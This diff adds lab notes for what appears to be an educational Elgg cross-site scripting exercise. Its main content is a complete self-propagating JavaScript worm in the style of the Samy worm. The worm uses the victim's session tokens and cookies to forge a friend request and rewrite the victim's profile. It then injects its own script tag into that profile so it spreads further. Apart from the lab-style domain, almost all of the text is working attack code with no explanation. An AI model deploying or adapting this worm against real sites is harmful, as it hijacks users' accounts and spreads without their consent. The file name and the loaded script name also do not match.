@@ -1,0 +1,42 @@
+
+Add the following code to samy's profile
+
+<script type="text/javascript" src='http://www.xsslabelgg.com/addfriendworm.js'></script>
+----------------------------------------------------------------------------------
+Now Create the following ajax script named addfriend.js and put it in website folder. In our case /var/www/XSS/elgg/
+
+alert('welcome');
+var Ajax=null;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=42&"+token+ts;
+Ajax=new XMLHttpRequest();
+Ajax.open("GET",sendurl,true);
+Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+Ajax.setRequestHeader("Keep-Alive","300");
+Ajax.setRequestHeader("Connection","keep-alive");
+Ajax.setRequestHeader("Cookie",document.cookie);
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+Ajax.send();
+Ajax=null;
+Ajax=new XMLHttpRequest();
+Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
+Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+Ajax.setRequestHeader("Keep-Alive","300");
+Ajax.setRequestHeader("Connection","keep-alive");
+Ajax.setRequestHeader("Cookie",document.cookie);
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+var userName=elgg.session.user.name;
+var desc="&description=Samy+is+MYHERO";
+var name="&name="+userName;
+
+var briefDesc="&briefdescription=<script+type=\"text/javascript\"+src=\"http://www.xsslabelgg.com/addfriendworm.js\"></script>&accesslevel%5Bbriefdescription%5D=2";
+var guid="&guid="+elgg.session.user.guid;
+var content=token+ts+name+briefDesc+desc+guid;
+alert(content);
+Ajax.send(content);
+
+
+------------------------------------------------------
+
+
